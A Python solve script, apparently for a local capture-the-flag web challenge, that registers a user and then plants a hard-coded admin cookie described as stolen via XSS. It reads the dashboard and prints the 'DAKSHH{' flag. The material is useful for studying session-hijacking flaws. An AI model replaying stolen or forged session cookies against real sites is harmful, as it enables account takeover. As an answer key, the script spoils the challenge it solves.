import requests
import sqlite3
import urllib.parse
import os

BASE_URL = "http://127.0.0.1:5007"
session = requests.Session()

# 1. Login to get a valid session (even admin cookie needs a valid session technically, though the code only checks the cookie)
print("1. Creating user and logging in...")
r_reg = session.post(f"{BASE_URL}/signup", data={"susername": "testuser@test.com", "spassword": "password123", "spassword2": "password123"})
r_login = session.post(f"{BASE_URL}/login", data={"username": "testuser@test.com", "password": "password123"})
print("Logged in?", "testuser" in r_login.text.lower() or r_login.url.endswith("dashboard"))
print("Login Text Snippet:", r_login.text[:200])

# 2. Set Admin Cookie Manually (Simulating the XSS steal + replace)
print("\n2. Simulating stolen Admin Cookie...")
session.cookies.set("_ga", "YWRtaW5fY29va2llc19pc192ZXJ5X3Rhc3R5", domain="127.0.0.1")

# 3. Access Dashboard to get the flag
print("\n3. Accessing Dashboard with Admin Cookie...")
r_dash = session.get(f"{BASE_URL}/dashboard")

if "DAKSHH{" in r_dash.text:
    print("SUCCESS! Found Flag!")
    for line in r_dash.text.splitlines():
        if "DAKSHH" in line:
            print(line.strip())
else:
    print("FAILED! Flag not found.")
